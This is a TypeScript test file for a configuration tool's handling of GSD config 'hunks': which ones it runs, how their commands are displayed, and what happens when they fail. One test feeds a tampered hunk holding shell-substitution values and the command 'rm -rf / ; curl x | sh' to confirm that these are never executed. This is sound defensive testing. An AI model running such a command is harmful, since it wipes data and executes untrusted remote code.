import { describe, expect, test } from 'claude-code/testing'

import type { GsdFact, HunkOp, InitFacts } from '../../types'
import { GSD_AUTONOMY } from '../framework/gsd/adapter'
import { isUnmetHunk } from '../framework/gsd/hunks'
import type { GsdToolContext } from '../framework/gsd/tools'
import { BIDI_OVERRIDE, EMPTY_FACTS, emptySetupScan, file, PROVEN_USER_GSD } from '../testkit'
import {
  hunkFailureLine,
  hunkNotRunLines,
  hunkProposal,
  hunkRuns,
  hunksAfterRuns,
  hunksNotRun,
  hunksShown,
} from './hunks'
import type { HunkRun } from './hunks'

/** A user-level GSD in the fixture home, as hunkStep builds the tool context from proven facts (D-71). */
const USER_GSD: GsdToolContext = {
  userDir: '/home/u/.claude/gsd-core',
  home: '/home/u',
  root: '/repo',
  configDir: null,
}

/** The GSD tool command as the plan displays it for the user-level GSD. */
const GSD_TOOLS = 'node ~/.claude/gsd-core/bin/gsd-tools.cjs'

/** The required GSD `mode` hunk, accepted and runnable, as hunkStep builds it. */
const MODE_HUNK: HunkOp = {
  kind: 'hunk',
  file: '.planning/config.json',
  key: 'mode',
  before: '"interactive"',
  after: '"yolo"',
  isRequired: true,
  isAccepted: true,
  isRunnable: true,
  command: `${GSD_TOOLS} config-set mode yolo`,
}

/** The optional GSD context-warnings hunk, accepted and runnable. */
const WARNINGS_HUNK: HunkOp = {
  ...MODE_HUNK,
  key: 'hooks.context_warnings',
  before: 'not set (GSD default)',
  after: 'false',
  isRequired: false,
  command: `${GSD_TOOLS} config-set hooks.context_warnings false`,
}

/** The run of MODE_HUNK through the user-level GSD. */
const MODE_RUN: HunkRun = {
  key: 'mode',
  file: '.planning/config.json',
  argv: ['node', '/home/u/.claude/gsd-core/bin/gsd-tools.cjs', 'config-set', 'mode', 'yolo'],
  display: `${GSD_TOOLS} config-set mode yolo`,
}

/** Where a not-run line shows a command from: the fixture repo and home folder, no CLAUDE_CONFIG_DIR. */
const SHOWN = { home: '/home/u', root: '/repo', configDir: null }

/** The repo's own GSD copy, proven, as the facts read it again after the installs. */
const REPO_GSD: GsdFact = { ...PROVEN_USER_GSD, location: 'project', dir: '<repo>/.claude/gsd-core' }

/** The facts after the installs with the repo's own GSD copy and no user-level GSD. */
const REPO_COPY: InitFacts = { facts: { ...EMPTY_FACTS, gsd: [REPO_GSD] }, gsdUserDir: null }

/** The facts after the installs with no GSD known. */
const NONE_KNOWN: InitFacts = { facts: EMPTY_FACTS, gsdUserDir: null }

/** The facts after the installs with no repo copy and a user-level GSD found but not proven. */
const UNPROVEN_USER: InitFacts = {
  facts: { ...EMPTY_FACTS, gsd: [{ ...PROVEN_USER_GSD, identity: 'unknown' }] },
  gsdUserDir: '/home/u/.claude/gsd-core',
}

/** The `mode` command as the plan shows it with no proven user-level GSD: the repo-local copy. */
const REPO_MODE = 'node .claude/gsd-core/bin/gsd-tools.cjs config-set mode yolo'

/** What the not-run line of a required hunk ends with: the next step once the person ran its command. */
const NEXT_STEP = ', then /cadre regen; the GSD roles stay attended until then'

/** What the plan row of an accepted hunk not run shows in place of a command when no GSD is known. */
const GSD_WAIT = 'waits for GSD (not installed for this repo)'

describe('hunk runs (D-106)', () => {
  test('hunkProposal finds the proposal an adapter offers for this setup by the hunk file and key; else null', () => {
    const statusline = emptySetupScan({
      carry: { autoCompactWindow: null, hasStatusLine: true, isGsdStatusline: true, envNames: [] },
    })

    expect(hunkProposal(emptySetupScan(), MODE_HUNK)).toEqual(GSD_AUTONOMY.find(proposal => proposal.key === 'mode'))
    expect(hunkProposal(emptySetupScan(), { ...MODE_HUNK, file: '.claude/settings.json' })).toBeNull()
    expect(hunkProposal(emptySetupScan(), { ...MODE_HUNK, key: 'workflow.unknown' })).toBeNull()
    expect(hunkProposal(emptySetupScan(), WARNINGS_HUNK)).toBeNull()
    expect(hunkProposal(statusline, WARNINGS_HUNK)?.key).toBe('hooks.context_warnings')
  })

  test('an accepted, runnable hunk runs the argv its adapter proposal resolves to, with its display', () => {
    expect(hunkRuns([MODE_HUNK], emptySetupScan(), USER_GSD)).toEqual([MODE_RUN])
  })

  test('the displayed command and values are never read: a tampered hunk still runs the proposal argv', () => {
    const tampered: HunkOp = { ...MODE_HUNK, before: '$(boom)', after: '`id`', command: 'rm -rf / ; curl x | sh' }

    expect(hunkRuns([tampered], emptySetupScan(), USER_GSD)).toEqual([MODE_RUN])
  })

  test('a declined hunk, one cadre cannot run and one no adapter offers give no run, in hunk order', () => {
    const declined: HunkOp = { ...MODE_HUNK, isAccepted: false }
    const notRunnable: HunkOp = { ...MODE_HUNK, isRunnable: false }
    const unknown: HunkOp = { ...MODE_HUNK, key: 'workflow.unknown' }
    const textMode: HunkOp = { ...MODE_HUNK, key: 'workflow.text_mode' }
    const runs = hunkRuns([declined, notRunnable, unknown, textMode, MODE_HUNK], emptySetupScan(), USER_GSD)

    expect(runs.map(run => run.key)).toEqual(['workflow.text_mode', 'mode'])
    expect(runs[0]?.argv).toEqual([
      'node',
      '/home/u/.claude/gsd-core/bin/gsd-tools.cjs',
      'config-set',
      'workflow.text_mode',
      'false',
    ])
  })

  test('without a user-level GSD no hunk runs: a repo-local GSD is printed, never run (D-28, D-72)', () => {
    expect(hunkRuns([MODE_HUNK, WARNINGS_HUNK], emptySetupScan(), { ...USER_GSD, userDir: null })).toEqual([])
    expect(hunkRuns([MODE_HUNK], emptySetupScan(), { ...USER_GSD, userDir: '.claude/gsd-core' })).toEqual([])
  })

  test('hunksAfterRuns makes a failed hunk not runnable, so a required one attends its roles (D-120)', () => {
    const after = hunksAfterRuns([MODE_HUNK, WARNINGS_HUNK], new Set(['mode']))

    expect(after).toEqual([{ ...MODE_HUNK, isRunnable: false }, WARNINGS_HUNK])
    expect(after.map(isUnmetHunk)).toEqual([true, false])
    expect(hunksAfterRuns([MODE_HUNK, WARNINGS_HUNK], new Set(['hooks.context_warnings'])).map(isUnmetHunk)).toEqual([
      false,
      false,
    ])
    expect(hunksAfterRuns([MODE_HUNK], new Set())).toEqual([MODE_HUNK])
    expect(MODE_HUNK.isRunnable).toBe(true)
  })

  test('hunkFailureLine names the file, the key and the command to run by hand, each cleaned', () => {
    const hostile: HunkRun = { ...MODE_RUN, key: `mo${BIDI_OVERRIDE}\nde` }

    expect(hunkFailureLine(MODE_RUN)).toBe(
      `the .planning/config.json change mode failed: run it yourself: ${GSD_TOOLS} config-set mode yolo`,
    )
    expect(hunkFailureLine(hostile)).toBe(
      `the .planning/config.json change mode failed: run it yourself: ${GSD_TOOLS} config-set mode yolo`,
    )
  })

  test('hunksNotRun gives the accepted hunks no run has, in hunk order; never a declined or a run one', () => {
    const declined: HunkOp = { ...WARNINGS_HUNK, isAccepted: false }
    const notRunnable: HunkOp = { ...MODE_HUNK, key: 'workflow.text_mode', isRunnable: false }

    expect(hunksNotRun([MODE_HUNK, WARNINGS_HUNK], [])).toEqual([MODE_HUNK, WARNINGS_HUNK])
    expect(hunksNotRun([MODE_HUNK, WARNINGS_HUNK], [MODE_RUN])).toEqual([WARNINGS_HUNK])
    expect(hunksNotRun([declined, notRunnable, MODE_HUNK], [MODE_RUN])).toEqual([notRunnable])
    expect(hunksNotRun([], [MODE_RUN])).toEqual([])
  })

  test('with a repo copy hunkNotRunLines names the file, the key and its own command per hunk, each cleaned', () => {
    const repoMode: HunkOp = { ...MODE_HUNK, command: REPO_MODE }
    const hostile: HunkOp = { ...repoMode, key: `mo${BIDI_OVERRIDE}\nde` }
    const line =
      `the .planning/config.json change mode was not run by cadre: run this yourself: ${REPO_MODE}${NEXT_STEP}`
    const unknownGsd: GsdFact = { ...REPO_GSD, identity: 'unknown' }
    const unknownCopy: InitFacts = { ...REPO_COPY, facts: { ...EMPTY_FACTS, gsd: [unknownGsd] } }

    expect(hunkNotRunLines([repoMode], emptySetupScan(), REPO_COPY, SHOWN)).toEqual([line])
    expect(hunkNotRunLines([hostile], emptySetupScan(), REPO_COPY, SHOWN)).toEqual([line])
    expect(hunkNotRunLines([repoMode, repoMode], emptySetupScan(), unknownCopy, SHOWN)).toEqual([line, line])
  })

  test('hunkNotRunLines gives no line for no hunk', () => {
    expect(hunkNotRunLines([], emptySetupScan(), NONE_KNOWN, SHOWN)).toEqual([])
    expect(hunkNotRunLines([], emptySetupScan(), REPO_COPY, SHOWN)).toEqual([])
  })

  test('with no GSD known after the installs the accepted hunks wait for it in one line, keys cleaned', () => {
    const textMode: HunkOp = { ...MODE_HUNK, key: 'workflow.text_mode', before: 'true', after: 'false' }
    const hostile: HunkOp = { ...textMode, key: `workflow.text${BIDI_OVERRIDE}\n_mode` }
    const line =
      'GSD is not installed for this repo, so the accepted .planning/config.json changes wait for it: ' +
      'mode, workflow.text_mode'

    expect(hunkNotRunLines([MODE_HUNK, textMode], emptySetupScan(), NONE_KNOWN, SHOWN)).toEqual([line])
    expect(hunkNotRunLines([MODE_HUNK, hostile], emptySetupScan(), NONE_KNOWN, SHOWN)).toEqual([line])
  })

  test('with no repo copy an unproven user-level GSD shows its ~/ command; a hunk no adapter offers its own', () => {
    const repoMode: HunkOp = { ...MODE_HUNK, command: REPO_MODE }
    const unoffered: HunkOp = { ...repoMode, key: 'workflow.unknown', command: 'node .claude/x config-set unknown on' }

    expect(hunkNotRunLines([repoMode, unoffered], emptySetupScan(), UNPROVEN_USER, SHOWN)).toEqual([
      'the .planning/config.json change mode was not run by cadre: run this yourself: ' +
        `node ~/.claude/gsd-core/bin/gsd-tools.cjs config-set mode yolo${NEXT_STEP}`,
      'the .planning/config.json change workflow.unknown was not run by cadre: run this yourself: ' +
        `node .claude/x config-set unknown on${NEXT_STEP}`,
    ])
  })

  test('an optional hunk not run keeps the line with its command alone, for the repo copy and the ~/ command', () => {
    const statusline = emptySetupScan({
      carry: { autoCompactWindow: null, hasStatusLine: true, isGsdStatusline: true, envNames: [] },
    })
    const repoCommand = 'node .claude/gsd-core/bin/gsd-tools.cjs config-set hooks.context_warnings false'
    const repoWarnings: HunkOp = { ...WARNINGS_HUNK, command: repoCommand }
    const change = 'the .planning/config.json change hooks.context_warnings was not run by cadre: run this yourself: '

    expect(hunkNotRunLines([repoWarnings], statusline, REPO_COPY, SHOWN)).toEqual([`${change}${repoCommand}`])
    expect(hunkNotRunLines([repoWarnings], statusline, UNPROVEN_USER, SHOWN)).toEqual([
      `${change}${GSD_TOOLS} config-set hooks.context_warnings false`,
    ])
  })
})

describe('hunksShown: the hunks as the post-apply plan shows them', () => {
  const repoMode: HunkOp = { ...MODE_HUNK, command: REPO_MODE }

  test('with a repo copy an accepted hunk not run keeps its own command', () => {
    expect(hunksShown([repoMode], [repoMode], emptySetupScan(), REPO_COPY, SHOWN)).toEqual([repoMode])
  })

  test('with no repo copy an unproven user-level GSD gives the ~/ command', () => {
    expect(hunksShown([repoMode], [repoMode], emptySetupScan(), UNPROVEN_USER, SHOWN)).toEqual([
      { ...repoMode, command: `${GSD_TOOLS} config-set mode yolo` },
    ])
  })

  test('with no GSD known an accepted hunk not run shows the wait text', () => {
    expect(hunksShown([repoMode], [repoMode], emptySetupScan(), NONE_KNOWN, SHOWN)).toEqual([
      { ...repoMode, command: GSD_WAIT },
    ])
  })

  test('a hunk cadre ran, one that failed and one declined are returned as they are', () => {
    const failed: HunkOp = { ...WARNINGS_HUNK, isRunnable: false }
    const declined: HunkOp = { ...repoMode, key: 'workflow.text_mode', isAccepted: false }
    const waiting: HunkOp = { ...repoMode, key: 'workflow.unknown' }
    const shown = hunksShown([MODE_HUNK, failed, declined, waiting], [waiting], emptySetupScan(), NONE_KNOWN, SHOWN)

    expect(shown).toEqual([MODE_HUNK, failed, declined, { ...waiting, command: GSD_WAIT }])
  })

  test('the hunks given and their array are not changed', () => {
    const hunks = [repoMode]
    const shown = hunksShown(hunks, hunks, emptySetupScan(), NONE_KNOWN, SHOWN)

    expect([shown === hunks, hunks.length, hunks[0] === repoMode, repoMode.command]).toEqual([
      false,
      1,
      true,
      REPO_MODE,
    ])
    expect(shown[0]?.command).toBe(GSD_WAIT)
  })
})
